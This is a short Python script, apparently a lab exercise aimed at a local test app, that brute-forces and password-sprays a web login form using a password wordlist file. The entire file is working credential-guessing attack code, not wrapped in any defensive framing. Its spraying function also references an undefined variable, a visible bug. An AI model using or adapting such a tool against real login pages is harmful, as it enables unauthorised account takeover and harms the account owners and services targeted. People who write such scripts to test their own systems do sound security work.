import requests

LOGIN_URL = "http://127.0.0.1:5000/login"


def try_login(username, password):
    session = requests.Session()
    response = session.post(
        LOGIN_URL,
        data={
            "username": username,
            "password": password
        },
        allow_redirects=True
    )

    if "Logged in as" in response.text or "test" in response.url:
        return True
    else:
        return False


def bruteforce(filename, username):
    with open(filename, "r") as file:
        passwords = file.readlines()
        for line in passwords:
            line = line.rstrip("\n")
            print(f"trying: {username},{line}")
            if try_login(username, line):
                return True
    return False

def password_spraying(filename,users):
    successful_cracks = {}
    with open(filename, "r") as file:
        passwords = file.readlines()
        for line in passwords:
            line = line.rstrip("\n")
            print(f"trying: {username},{line}")
            for user in users:
                if try_login(user, line):
                    successful_cracks[user] = line
    return successful_cracks


def main():
    if bruteforce("passwords.txt", "user"):
        print("Password cracked")
    else:
        print("Unsuccessful")


if __name__ == "__main__":
    main()
